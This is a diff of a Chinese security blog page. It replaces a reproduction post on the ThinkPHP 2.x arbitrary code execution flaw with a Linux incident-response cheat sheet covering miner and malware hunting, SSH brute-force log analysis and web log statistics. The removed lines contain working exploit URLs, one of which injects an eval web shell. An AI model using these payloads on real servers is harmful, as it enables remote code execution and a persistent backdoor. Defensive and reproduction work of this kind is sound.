@@ -6,23 +6,27 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="https://laohuan12138.github.io">
-  <title>ThinkPHP 2.x 任意代码执行漏洞 | Laohuan&#39;s Blog</title>
+  <title>Linux应急响应命令速查 | Laohuan&#39;s Blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="背景ThinkPHP 2.x版本中，使用preg_replace的&#x2F;e模式匹配路由： 1$res &#x3D; preg_replace(&#39;@(\w+)&#39;.$depr.&#39;([^&#39;.$depr.&#39;\&#x2F;]+)@e&#39;, &#39;$var[\&#39;\\1\&#39;]&#x3D;&quot;\\2&quot;;&#39;, implode($depr,$paths));  导致用户的输入参数被插入双引号中执行，造成任意代码执行漏洞。 ThinkPHP 3.0版本因为Li">
+  <meta name="description" content="Linux应急响应命令速查前言再处理应急响应事件中，很多命令过长而难以记住，遂将相关应急响应命令做一个整合，方便后续应急事件的处理。所有命令来源于网络及各位大佬的收集整理。">
 <meta property="og:type" content="article">
-<meta property="og:title" content="ThinkPHP 2.x 任意代码执行漏洞">
-<meta property="og:url" content="https://laohuan12138.github.io/2020/06/13/ThinkPHP%202.x%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:title" content="Linux应急响应命令速查">
+<meta property="og:url" content="https://laohuan12138.github.io/2022/10/10/Linux%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/index.html">
 <meta property="og:site_name" content="Laohuan&#39;s Blog">
-<meta property="og:description" content="背景ThinkPHP 2.x版本中，使用preg_replace的&#x2F;e模式匹配路由： 1$res &#x3D; preg_replace(&#39;@(\w+)&#39;.$depr.&#39;([^&#39;.$depr.&#39;\&#x2F;]+)@e&#39;, &#39;$var[\&#39;\\1\&#39;]&#x3D;&quot;\\2&quot;;&#39;, implode($depr,$paths));  导致用户的输入参数被插入双引号中执行，造成任意代码执行漏洞。 ThinkPHP 3.0版本因为Li">
+<meta property="og:description" content="Linux应急响应命令速查前言再处理应急响应事件中，很多命令过长而难以记住，遂将相关应急响应命令做一个整合，方便后续应急事件的处理。所有命令来源于网络及各位大佬的收集整理。">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="http://cdn.laohuan.art/2020-06-13_15-57-09.png">
-<meta property="og:image" content="http://cdn.laohuan.art/2020-06-13_16-15-37.png">
-<meta property="article:published_time" content="2020-06-13T07:48:27.000Z">
-<meta property="article:modified_time" content="2021-04-19T03:46:52.872Z">
+<meta property="og:image" content="https://cdn.laohuan.art/image-20221007154207343.png">
+<meta property="og:image" content="https://cdn.laohuan.art/image-20221007160431335.png">
+<meta property="og:image" content="https://cdn.laohuan.art/image-20221007160653206.png">
+<meta property="og:image" content="https://cdn.laohuan.art/image-20221007160924764.png">
+<meta property="og:image" content="https://cdn.laohuan.art/image-20221007161242953.png">
+<meta property="og:image" content="https://cdn.laohuan.art/image-20221007161638799.png">
+<meta property="article:published_time" content="2022-10-10T08:54:50.000Z">
+<meta property="article:modified_time" content="2022-10-10T08:57:50.357Z">
 <meta property="article:author" content="Laohuan">
-<meta property="article:tag" content="ThinkPHP">
+<meta property="article:tag" content="应急响应">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://cdn.laohuan.art/2020-06-13_15-57-09.png">
+<meta name="twitter:image" content="https://cdn.laohuan.art/image-20221007154207343.png">
   
     <link rel="alternative" href="/atom.xml" title="Laohuan&#39;s Blog" type="application/atom+xml">
   
@@ -236,14 +240,14 @@
           </div>
           <div id="js-content" class="content-ll">
             
-<article id="post-ThinkPHP 2.x任意代码执行漏洞" class="article article-type-post " itemscope itemprop="blogPost">
+<article id="post-Linux应急响应命令速查" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      ThinkPHP 2.x 任意代码执行漏洞
+      Linux应急响应命令速查
     </h1>
   
 
@@ -252,47 +256,166 @@
         
         
         
-<a href="/2020/06/13/ThinkPHP%202.x%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="archive-article-date">
-  	<time datetime="2020-06-13T07:48:27.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-06-13</time>
+<a href="/2022/10/10/Linux%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/" class="archive-article-date">
+  	<time datetime="2022-10-10T08:54:50.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-10-10</time>
 </a>
         
 		
 	
       </header>
 	  <div align="center" class="post-count">
-    字数：175字 | 预计阅读时长：1分钟
+    字数：1.5k字 | 预计阅读时长：7分钟
 </div>
 	  
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h4><span id="背景">背景</span></h4><p>ThinkPHP 2.x版本中，使用<code>preg_replace</code>的<code>/e</code>模式匹配路由：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$res = preg_replace(<span class="string">'@(\w+)'</span>.$depr.<span class="string">'([^'</span>.$depr.<span class="string">'\/]+)@e'</span>, <span class="string">'$var[\'\\1\']="\\2";'</span>, implode($depr,$paths));</span><br></pre></td></tr></table></figure>
-
-<p>导致用户的输入参数被插入双引号中执行，造成任意代码执行漏洞。</p>
-<p>ThinkPHP 3.0版本因为Lite模式下没有修复该漏洞，也存在这个漏洞。</p>
+        <h1><span id="linux应急响应命令速查">Linux应急响应命令速查</span></h1><h2><span id="前言">前言</span></h2><p>再处理应急响应事件中，很多命令过长而难以记住，遂将相关应急响应命令做一个整合，方便后续应急事件的处理。所有命令来源于网络及各位大佬的收集整理。</p>
 <a id="more"></a>
 
-<h4><span id="复现过程">复现过程</span></h4><p>1.使用如下POC可查看phpinfo信息</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;your-ip:8080&#x2F;index.php?s&#x3D;&#x2F;index&#x2F;index&#x2F;name&#x2F;$%7B@phpinfo()%7D</span><br></pre></td></tr></table></figure>
-
-
-
-<p><img src="http://cdn.laohuan.art/2020-06-13_15-57-09.png" alt></p>
-<p>2.使用蚁剑连接</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;IP:8080&#x2F;index.php?s&#x3D;&#x2F;index&#x2F;index&#x2F;name&#x2F;$&#123;@print%28eval%28$_POST[1234]%29%29&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<p><img src="http://cdn.laohuan.art/2020-06-13_16-15-37.png" alt></p>
-<p>3.url编码</p>
+<h2><span id="挖矿及勒索远控排查">挖矿及勒索远控排查</span></h2><p>挖矿一般导致CPU或者GPU占用过高，重点排查进程的相关资源占用及网络连接，同时对计划任务和启动项做检查和清理。</p>
+<h3><span id="0x1-资源占用情况">0x1 资源占用情况</span></h3><p>1.cpu占用</p>
+<p><code>top -c -o %CPU</code></p>
+<p>查看cpu占用前5的进程</p>
+<p><code>ps -eo pid,ppid,%mem,%cpu,cmd --sort=-%cpu | head -n 5</code></p>
+<p>2.内存占用</p>
+<p><code>top -c -o %MEM</code></p>
+<p><code>ps -eo pid,ppid,%mem,%cpu,cmd --sort=-%mem | head -n 5</code></p>
+<h3><span id="0x2-寻找恶意样本">0x2 寻找恶意样本</span></h3><p>根据进程名字获取PID</p>
 <ul>
-<li>%7B: {</li>
-<li>%7D: }</li>
-<li>%28: (</li>
-<li>%29: )</li>
+<li><code>pidof &quot;procee_name&quot;</code></li>
+<li><code>ps -aux | grep &quot;name&quot;</code></li>
+<li><code>pgrep -f &quot;name&quot;</code></li>
 </ul>
-<h4><span id="参考链接">参考链接</span></h4><p><a href="https://github.com/vulhub/vulhub/tree/master/thinkphp/2-rce/" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/thinkphp/2-rce/</a></p>
+<p>根据PID获取进程详细信息</p>
+<ul>
+<li><code>lsof -p pid</code></li>
+<li><code>pwdx pid</code> //启动恶意程序的文件路径</li>
+</ul>
+<p>根据pid查看进程拉起的线程</p>
+<ul>
+<li><code>ps H -T -p pid</code></li>
+<li><code>ps -Lf pid</code></li>
+<li><code>pstree -agplU</code></li>
+</ul>
+<p>查看程序运行时间</p>
+<p><code>ps -eo pid,lstart,etime,cmd | grep pid</code></p>
+<p>查看文件相关操作时间</p>
+<p><code>stat filename</code></p>
+<p>文件查找</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">文件修改</span><br><span class="line">find &#x2F; -mtime -3 &#x2F;&#x2F;最近3天修改过的文件</span><br><span class="line">find &#x2F; -mtime +3 &#x2F;&#x2F;3天前修改过的文件</span><br><span class="line">find &#x2F; -mtime -1  &#x2F;&#x2F;最近24小时修改过的文件</span><br><span class="line">find &#x2F; -mmin +3  &#x2F;&#x2F;三分钟前编辑过的文件</span><br><span class="line">find &#x2F;var&#x2F;www&#x2F;html&#x2F; -mtime -1 -name *.php</span><br><span class="line">文件访问</span><br><span class="line">find &#x2F; -atime -3 &#x2F;&#x2F;最近3天访问过的文件</span><br><span class="line">find &#x2F; -atime -24 &#x2F;&#x2F;最近24小时访问的文件</span><br><span class="line"></span><br><span class="line">属性修改</span><br><span class="line">find &#x2F; -cmin -3 &#x2F;&#x2F;3分钟内修改属性的文件</span><br><span class="line"></span><br><span class="line">文件大小</span><br><span class="line">find &#x2F; -size 10M &#x2F;&#x2F;寻找10m的文件</span><br><span class="line">find &#x2F; -size +10M  &#x2F;&#x2F;大于10m的文件</span><br><span class="line">find &#x2F; -size -10M &#x2F;&#x2F;小于10m的文件</span><br><span class="line">find &#x2F; -size +10MB -20M &#x2F;&#x2F;介于10m和20m的文件</span><br></pre></td></tr></table></figure>
+
+
+
+<h3><span id="0x3-恶意进程处理">0x3 恶意进程处理</span></h3><p>查看进程及子进程</p>
+<p><code>ps ajfx</code></p>
+<p>杀死进程</p>
+<p><code>kill -9 pid</code></p>
+<p>杀死进程及进程组</p>
+<p><code>kill -9 -1134</code>//进程pid前面有个<strong>-</strong></p>
+<p>查看文件占用</p>
+<p><code>lsof file.sh</code></p>
+<p>文件加锁</p>
+<ul>
+<li>a属性，只能增加内容，无法修改和删除之前的文件</li>
+<li>i属性，无法改变内容及删除文件</li>
+</ul>
+<p><code>chattr -a</code></p>
+<p><code>chattr -i</code></p>
+<h3><span id="0x4-网络连接">0x4 网络连接</span></h3><p><code>netstat -pantu | grep 8.8.8.8</code></p>
+<p><code>netstat -pantu | grep 80</code></p>
+<p>根据文件找pid</p>
+<p><code>lsof | grep install.sh</code></p>
+<p><code>lsof /root/start.sh</code></p>
+<h3><span id="0x5-计划任务">0x5 计划任务</span></h3><p>列出当前用户计划任务</p>
+<p><code>crontab -l</code></p>
+<p>删除计划任务</p>
+<p><code>crontab -r</code></p>
+<p>检查如下目录是否存在恶意脚本</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">/var/spool/cron/*</span><br><span class="line">/var/spool/anacron/*</span><br><span class="line">/etc/crontab</span><br><span class="line">/etc/cron.d/*</span><br><span class="line">/etc/cron.daily/*</span><br><span class="line">/etc/cron.hourly/*</span><br><span class="line">/etc/cron.monthly/*</span><br><span class="line">/etc/cron.weekly/</span><br><span class="line">/etc/anacrontab</span><br></pre></td></tr></table></figure>
+
+<p>开机启动项</p>
+<ul>
+<li><code>/etc/init.d</code></li>
+<li>/etc/rc.d/*</li>
+<li>/etc/rc.local</li>
+<li>/etc/rc[0-6].d</li>
+<li>/etc/inittab</li>
+</ul>
+<h2><span id="暴力破解">暴力破解</span></h2><h3><span id="0x1-ssh">0x1  SSH</span></h3><p>1.查找特殊权限的账号，默认root</p>
+<p><code>awk -F: &#39;{if($3==0) print $1}&#39; /etc/passwd</code></p>
+<p><img src="https://cdn.laohuan.art/image-20221007154207343.png" alt="image-20221007154207343"></p>
+<p>2.查找可以登陆ssh的账号</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s=$( sudo cat /etc/shadow | grep <span class="string">'^[^:]*:[^\*!]'</span> | awk -F: <span class="string">'&#123;print $1&#125;'</span>);<span class="keyword">for</span> i <span class="keyword">in</span> <span class="variable">$s</span>;<span class="keyword">do</span> cat /etc/passwd | grep -v <span class="string">"/bin/false\|/nologin"</span>| grep <span class="variable">$i</span>;<span class="keyword">done</span> | sort | uniq |awk -F: <span class="string">'&#123;print $1&#125;'</span></span><br></pre></td></tr></table></figure>
+
+<p>3.查看相关登陆session</p>
+<ul>
+<li><code>who -a</code></li>
+<li><code>w</code></li>
+<li><code>last -p now</code></li>
+<li><code>sudo netstat -tnpa | grep &#39;ESTABLISHED.*sshd&#39;</code></li>
+<li><code>echo $SSH_CONNECTION</code></li>
+<li><code>ss | grep ssh</code></li>
+</ul>
+<p><strong>日志相关</strong></p>
+<p>日志位置</p>
+<ul>
+<li><p>Ubuntu</p>
+<p><code>/var/log/auth.log</code></p>
+</li>
+<li><p>Centos</p>
+<p><code>/var/log/secure</code></p>
+</li>
+</ul>
+<p>快捷命令</p>
+<ul>
+<li><p><code>lastb</code> //登陆失败记录</p>
+</li>
+<li><p><code>lastlog</code> //最后一次登陆</p>
+</li>
+<li><p><code>last</code> //登陆成功记录</p>
+</li>
+<li><p>查看登陆成功的日志</p>
+</li>
+</ul>
+<p><code>cat /var/log/auth.log | grep &quot;Accept&quot;</code></p>
+<p><img src="https://cdn.laohuan.art/image-20221007160431335.png" alt="image-20221007160431335"></p>
+<ul>
+<li>查看登陆失败的日志</li>
+</ul>
+<p><code>cat /var/log/auth.log | grep &quot;Failed password for&quot; | more</code></p>
+<p><img src="https://cdn.laohuan.art/image-20221007160653206.png" alt="image-20221007160653206"></p>
+<ul>
+<li>统计暴力破解的用户名</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep <span class="string">"Failed password"</span> /var/<span class="built_in">log</span>/auth.log|perl -e <span class="string">'while($_=&lt;&gt;)&#123;/for(.*?)from/; print "$1\n";&#125;'</span>|sort|uniq -c|sort -nr</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.laohuan.art/image-20221007160924764.png" alt="image-20221007160924764"></p>
+<p>invaild user说明此用户不存在，但是却出现登陆记录</p>
+<ul>
+<li><p>统计用root爆破的IP</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /var/<span class="built_in">log</span>/auth.log | grep <span class="string">"Failed password for"</span> | grep <span class="string">"root"</span> | grep -Po <span class="string">'(1\d&#123;2&#125;|2[0 4]\d|25[0-5]|[1-9]\d|[1-9])(\.(1\d&#123;2&#125;|2[0-4]\d|25[0-5]|[1-9]\d|\d))&#123;3&#125;'</span> |sort|uniq -c|sort -nr</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.laohuan.art/image-20221007161242953.png" alt="image-20221007161242953"></p>
+</li>
+<li><p>查询所有登陆失败的IP</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo cat /var/<span class="built_in">log</span>/auth.log | grep <span class="string">"Failed password for"</span> | cut -d <span class="string">" "</span> -f 9 | sort -nr | uniq|grep -v <span class="string">"invalid"</span>| <span class="keyword">while</span> <span class="built_in">read</span> line;<span class="keyword">do</span> <span class="built_in">echo</span> [<span class="variable">$line</span>];sudo cat /var/<span class="built_in">log</span>/auth.log | grep <span class="string">"Failed password for"</span> | grep <span class="variable">$line</span> | grep -Po <span class="string">'(1\d&#123;2&#125;|2[0-4]\d|25[0-5]|[1-9]\d|[1-9])(\.(1\d&#123;2&#125;|2[0-4]\d|25[0-5]|[1-9]\d|\d))&#123;3&#125; '</span>|sort|uniq -c |sort -nr; <span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.laohuan.art/image-20221007161638799.png" alt="image-20221007161638799"></p>
+</li>
+<li><p>登陆成功的日期、用户、IP</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep <span class="string">"Accepted "</span> /var/<span class="built_in">log</span>/auth.log | awk <span class="string">'&#123;print $1,$2,$3,$9,$11&#125;'</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>查看拥有sudo权限的账号</p>
+<p><code>cat /etc/sudoers | grep -v &quot;^#\|^$&quot; | grep &quot;ALL=(ALL)&quot;</code></p>
+</li>
+</ul>
+<h2><span id="web日志分析">Web日志分析</span></h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">1、列出当天访问次数最多的IP命令：</span><br><span class="line">cut -d- -f 1 log_file|uniq -c | sort -rn | head -20</span><br><span class="line"></span><br><span class="line">2、查看当天有多少个IP访问：</span><br><span class="line">awk <span class="string">'&#123;print $1&#125;'</span> log_file|sort|uniq|wc -l</span><br><span class="line"></span><br><span class="line">3、查看某一个页面被访问的次数：</span><br><span class="line">grep <span class="string">"/index.php"</span> log_file | wc -l</span><br><span class="line"></span><br><span class="line">4、查看每一个IP访问了多少个页面：</span><br><span class="line">awk <span class="string">'&#123;++S[$1]&#125; END &#123;for (a in S) print a,S[a]&#125;'</span> log_file</span><br><span class="line"></span><br><span class="line">5、将每个IP访问的页面数进行从小到大排序：</span><br><span class="line">awk <span class="string">'&#123;++S[$1]&#125; END &#123;for (a in S) print S[a],a&#125;'</span> log_file | sort -n</span><br><span class="line"></span><br><span class="line">6、查看某一个IP访问了哪些页面：</span><br><span class="line">grep ^111.111.111.111 log_file| awk <span class="string">'&#123;print $1,$7&#125;'</span></span><br><span class="line"></span><br><span class="line">7、去掉搜索引擎统计当天的页面：</span><br><span class="line">awk <span class="string">'&#123;print $12,$1&#125;'</span> log_file | grep ^\"Mozilla | awk <span class="string">'&#123;print $2&#125;'</span> |sort | uniq | wc -l</span><br><span class="line"></span><br><span class="line">8、查看2018年6月21日14时这一个小时内有多少IP访问:</span><br><span class="line">awk <span class="string">'&#123;print $4,$1&#125;'</span> log_file | grep 21/Jun/2018:14 | awk <span class="string">'&#123;print $2&#125;'</span>| sort | uniq | wc -l</span><br><span class="line"></span><br><span class="line">9、查看某天IP访问量</span><br><span class="line">grep <span class="string">'23/May/2019'</span> /www/logs/access.log | awk <span class="string">'&#123;print $1&#125;'</span> | awk -F<span class="string">'.'</span> <span class="string">'&#123;print $1"."$2"."$3"."$4&#125;'</span> | sort | uniq -c | sort -r -n | head -n 10</span><br><span class="line"></span><br><span class="line">10、统计网段</span><br><span class="line">cat /www/logs/access.log | awk <span class="string">'&#123;print $1&#125;'</span> | awk -F<span class="string">'.'</span> <span class="string">'&#123;print $1"."$2"."$3".0"&#125;'</span> | sort | uniq -c | sort -r -n | head -n 200</span><br><span class="line"></span><br><span class="line">11、统计域名</span><br><span class="line">cat  /www/logs/access.log |awk <span class="string">'&#123;print $2&#125;'</span>|sort|uniq -c|sort -rn|more</span><br><span class="line"></span><br><span class="line">12、统计http状态码</span><br><span class="line">cat  /www/logs/access.log |awk <span class="string">'&#123;print $9&#125;'</span>|sort|uniq -c|sort -rn|more</span><br><span class="line"></span><br><span class="line">13、url统计</span><br><span class="line">cat  /www/logs/access.log |awk <span class="string">'&#123;print $7&#125;'</span>|sort|uniq -c|sort -rn|more</span><br><span class="line"></span><br><span class="line">14、url访问量统计</span><br><span class="line">cat /www/logs/access.log | awk <span class="string">'&#123;print $7&#125;'</span> | egrep <span class="string">'\?|&amp;'</span> | sort | uniq -c | sort -rn | more</span><br><span class="line"></span><br><span class="line">15、url提取</span><br><span class="line">tail -f /www/logs/access.2019-02-23.log | grep <span class="string">'/index.html'</span> | awk <span class="string">'&#123;print $1" "$7&#125;'</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
 
       
 
@@ -336,7 +459,7 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">ThinkPHP</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">应急响应</a>
         		</li>
       		
 		</ul>
@@ -348,7 +471,7 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="/categories/漏洞复现//" class="article-tag-list-link color5">漏洞复现</a>
+        			<a href="/categories/渗透测试//" class="article-tag-list-link color5">渗透测试</a>
         		</li>
       		
 		</ul>
@@ -403,7 +526,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=https://laohuan12138.github.io/2020/06/13/ThinkPHP%202.x%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=https://laohuan12138.github.io/2022/10/10/Linux%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -417,18 +540,9 @@
   
 <nav id="article-nav">
   
-    <a href="/2020/06/13/ThinkPHP%205.0.22-5.1.29%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          ThinkPHP5 5.0.22/5.1.29 远程代码执行漏洞
-        
-      </div>
-    </a>
   
-  
-    <a href="/2020/06/13/saltstack/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">saltstack</div>
+    <a href="/2022/07/13/pikachu%E9%9D%B6%E5%9C%BA/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">pikachu靶场</div>
       <i class="icon-circle-right"></i>
     </a>
   
@@ -455,7 +569,7 @@
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#"><span class="toc-number">1.</span> <span class="toc-text">背景</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#"><span class="toc-number">2.</span> <span class="toc-text">复现过程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#"><span class="toc-number">3.</span> <span class="toc-text">参考链接</span></a></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#"><span class="toc-number">1.</span> <span class="toc-text">Linux应急响应命令速查</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#"><span class="toc-number">1.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#"><span class="toc-number">1.2.</span> <span class="toc-text">挖矿及勒索远控排查</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#"><span class="toc-number">1.2.1.</span> <span class="toc-text">0x1 资源占用情况</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#"><span class="toc-number">1.2.2.</span> <span class="toc-text">0x2 寻找恶意样本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#"><span class="toc-number">1.2.3.</span> <span class="toc-text">0x3 恶意进程处理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#"><span class="toc-number">1.2.4.</span> <span class="toc-text">0x4 网络连接</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#"><span class="toc-number">1.2.5.</span> <span class="toc-text">0x5 计划任务</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#"><span class="toc-number">1.3.</span> <span class="toc-text">暴力破解</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#"><span class="toc-number">1.3.1.</span> <span class="toc-text">0x1  SSH</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#"><span class="toc-number">1.4.</span> <span class="toc-text">Web日志分析</span></a></li></ol></li></ol>
                     </div>
                 </span>
             </div>
@@ -471,7 +585,7 @@
   
 
   
-  <div id="SOHUCS" sid="ThinkPHP 2.x任意代码执行漏洞" ></div> 
+  <div id="SOHUCS" sid="Linux应急响应命令速查" ></div> 
 <script charset="utf-8" type="text/javascript" src="//changyan.sohu.com/upload/changyan.js" ></script>
 <script type="text/javascript">
     window.changyan.api.config({
